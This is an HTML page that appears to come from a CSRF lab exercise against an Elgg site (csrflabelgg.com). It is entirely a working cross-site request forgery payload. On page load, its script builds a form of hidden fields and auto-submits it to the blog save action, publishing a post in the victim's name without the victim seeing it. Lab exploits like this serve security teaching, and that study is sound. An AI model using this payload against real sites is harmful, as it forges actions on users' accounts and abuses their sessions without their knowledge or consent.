<html>
	<body>
		<h1>I love you Alice <3</h1>
		<script type="text/javascript">
		function forge_post() {
			var fields;
			// The following are form entries need to be filled out by attackers.
			// The entries are made hidden, so the victim won't be able to see them.

			fields += "<input type='hidden' name='title' value='Boby is my hero'>";
			fields += "<input type='hidden' name='description' value='<p>I love him!<\p>'>";
			fields += "<input type='hidden' name='status' value='published'>";
			fields += "<input type='hidden' name='comments_on' value='On'>";
			fields += "<input type='hidden' name='container_guid' value='42'>";
			fields += "<input type='hidden' name='guid' value=''>";
			fields += "<input type='hidden' name='tag' value=''>";
			fields += "<input type='hidden' name='excerpt' value=''>";
			fields += "<input type='hidden' name='access_id' value='2'>";
			fields += "<input type='hidden' name='save' value='Save'>";

			// Create a <form> element.
			var p = document.createElement("form");
			// Construct the form
			p.action = "http://www.csrflabelgg.com/action/blog/save";
			p.innerHTML = fields;
			p.method = "post";
			// Append the form to the current page.
			document.body.appendChild(p);
			// Submit the form
		    p.submit();
		}
		// Invoke forge_post() after the page is loaded.
		window.onload = function() { forge_post();}
		</script>
	</body>
</html>
